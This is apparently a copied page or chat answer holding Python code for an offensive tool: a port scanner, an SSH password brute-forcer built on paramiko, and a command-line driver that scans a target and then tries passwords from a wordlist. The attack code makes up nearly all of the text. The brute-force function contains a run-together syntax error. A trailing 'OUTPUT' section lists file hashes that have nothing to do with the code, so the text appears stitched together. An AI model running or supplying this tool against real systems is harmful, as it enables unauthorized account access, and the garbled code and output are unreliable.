import socket

def scan_ports(host, ports=[21, 22, 80, 443]):
    results = {}
    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect((host, port))
                results[port] = "Open"
            except:
                results[port] = "Closed"
    return results

Brute-Forcer (modules/brute_forcer.py)
python
Copy
Edit
import paramiko

def ssh_brute_force(host, user, wordlist):
    for password in wordlist:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=user, password=password.strip(), timeout=3)
            return f"[+] Password found: {password}"
        except:
            continue return "[-] Password not found"Main CLI (main.py)
python
Copy
Edit
from modules import port_scanner, brute_forcer

def main():
    host = input("Enter target host: ")
    print("Scanning ports...")
    print(port_scanner.scan_ports(host))

    choice = input("Run SSH brute-force? (y/n): ")
    if choice.lower() == 'y':
        user = input("Username: ")
        with open("wordlists/common.txt") as f:
            passwords = f.readlines()
        print(brute_forcer.ssh_brute_force(host, user, passwords))

if __name__ == "__main__":
    main()

OUTPUT :

example.txt|77dc11e6c2e06bbd039022537f0de56aebde90760f02c182d5c49f9060acabbe
data.csv|24f667bd7ba0178876c41ae0100d61f719655939cd3cbedac56591d0268d2031